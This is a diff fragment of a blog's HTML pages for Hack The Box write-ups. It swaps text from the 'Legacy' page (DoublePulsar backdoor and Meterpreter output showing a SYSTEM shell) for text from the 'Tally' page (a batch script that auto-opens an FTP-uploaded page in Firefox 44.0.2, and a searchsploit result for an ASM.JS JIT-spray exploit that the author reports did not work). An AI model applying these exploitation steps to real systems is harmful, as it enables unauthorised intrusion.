-    [+] Backdoor returned code: 10 - Success!
-    [+] Command completed successfully
-[+] Doublepulsar Succeeded
-Back to metasploit:
+<p>On the box, there is Firefox version 44.0.2 and a script automatically opens C:\FTP\Intranet\index.html every now and then:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">C:\Users\Sarah\Desktop&gt; type browser.bat
+...
+REM copy latest mockups to webroot
+copy /Y C:\FTP\Intranet\index.html C:\inetpub\wwwroot\HRTJYKYRBSHYJ\index.html
 
-[*] Sending stage (179267 bytes) to 10.10.10.4
-[*] Meterpreter session 1 opened
+REM browse file
+start &#34;&#34; &#34;C:\Program Files (x86)\Mozilla Firefox\Firefox.exe&#34; &#34;http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html&#34;
+...</code></pre></div></div></p>
 
-meterpreter &gt; getuid
-Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></div></p>
+<p>In theory, we could exploit it by uploading an evil index.html via the FTP.
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ searchsploit firefox 44.0.2 -w
+
+Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.com/exploits/44294/</code></pre></div></div></p>
+
+<p>Unfortunately, I was not able to make it work. I even enabled RDP on the box and I connected to check what is going on. The exploit is opened normally but the firefox either crashes or it doesn&rsquo;t execute the payload properly.</p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&t=Legacy%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2flegacy_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&text=Legacy%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Legacy&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&description=Legacy%20write-up&media=https://alamot.github.io/images/legacy.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2flegacy_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Legacy&media=https://alamot.github.io/images/legacy.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2ftally_writeup%2f&t=Tally%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2ftally_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ftally_writeup%2f&text=Tally%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ftally_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Tally&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ftally_writeup%2f&description=Tally%20write-up&media=https://alamot.github.io/images/dart.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ftally_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Tally&media=https://alamot.github.io/images/dart.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -717,22 +876,6 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></div></p>
           
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -909,6 +1052,22 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></div></p>
           
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
